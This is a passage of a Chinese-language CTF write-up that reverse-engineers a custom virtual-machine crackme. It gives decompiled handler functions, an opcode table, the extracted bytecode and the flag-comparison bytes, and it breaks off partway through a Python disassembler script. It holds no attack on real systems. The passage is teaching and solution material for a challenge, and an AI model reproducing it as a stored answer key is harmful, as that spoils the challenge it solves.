<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_8F0</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  *a1 = a1[<span class="number">1</span>];</span><br><span class="line">  a1[<span class="number">1</span>] = v2;</span><br><span class="line">  ++*((_QWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_99C:对<code>a1</code>指向的数据结构中<strong>偏移 0 处（x）、4 处（y）、8 处（z）的三个 32 位整数</strong>执行线性组合运算（<code>x = z + 2y + 3x</code>），并将结果更新到偏移 0 处，同时将该结构中<strong>偏移 16 字节的 64 位计数器</strong>自增 1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_99C</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_DWORD *)a1 = *(_DWORD *)(a1 + <span class="number">8</span>) + <span class="number">2</span> * *(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">3</span> * *(_DWORD *)a1;</span><br><span class="line">  ++*(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_E0B循环调用sub_E6E,遇到0xF4就停止。是就是说指令达到0xF4就结束了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_E0B</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">16</span>) = &amp;unk_202060;</span><br><span class="line">  <span class="keyword">while</span> ( **(_BYTE **)(a1 + <span class="number">16</span>) != <span class="number">0xF4</span> )</span><br><span class="line">    sub_E6E(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_E6E</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; **(_BYTE **)(a1 + <span class="number">16</span>) != *(_BYTE *)(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">8</span>); ++i ) <span class="comment">//循环查找匹配的字节</span></span><br><span class="line">    ;</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64))(<span class="number">16</span> * (i + <span class="number">1LL</span>) + a1 + <span class="number">16</span>))(a1); <span class="comment">//调用匹配到的函数</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xF1 mov</span><br><span class="line">0xF2 xor</span><br><span class="line">0xF4 nop</span><br><span class="line">0xF5 input</span><br><span class="line">0xF7 mul</span><br><span class="line">0xF8 swap</span><br><span class="line">0xF6 x = z + 2y + 3x</span><br><span class="line">0xE1 寄存器 r1</span><br><span class="line">0xE2 寄存器 r2</span><br><span class="line">0xE3 寄存器 r3</span><br><span class="line">0xE4 内存单元 flag</span><br><span class="line">0xE5 寄存器 r4</span><br></pre></td></tr></table></figure>

<p>真flag验证函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_2022A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_2022A8 + i) != byte_202020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unsigned char byte_202020[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>提取出来操作码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line"><span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line"><span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line"><span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line"><span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span></span><br></pre></td></tr></table></figure>

<p>脚本转汇编</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=[<span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span 